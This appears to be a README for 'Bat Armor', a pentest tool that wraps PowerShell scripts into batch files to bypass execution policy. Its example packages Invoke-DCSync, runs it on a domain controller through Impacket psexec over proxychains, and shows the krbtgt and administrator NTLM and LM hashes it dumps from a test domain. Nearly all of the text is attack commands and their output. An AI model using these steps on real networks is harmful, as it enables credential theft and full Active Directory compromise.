# Bat Armor
Bypass PowerShell execution policy by encoding ps script into bat file.

# Example
Run Invoke-DCSync.ps1 to get krbtgt hash:

$ python bat_armor.py --script-path Invoke-DCSync.ps1\  
                    --launch-string "Invoke-DCSync -users krbtgt,administrator -alldata"\  
                    --out krbtgt.bat --target-filepath 'c:\windows\krbtgt.bat'  
  
$ python psexec.py pentesto.loc/administrator@dc01 -c krbtgt.bat  
ProxyChains-3.1 (http://proxychains.sf.net)  
Impacket v0.9.16-dev - Copyright 2002-2016 Core Security Technologies  
  
...  
  
  Hash NTLM: b8aa706788a3d8c6ac9a96684d7ff330  
    ntlm- 0: b8aa706788a3d8c6ac9a96684d7ff330  
    lm  - 0: 6829621ea2044b0e931f83e0b62b4b8c  
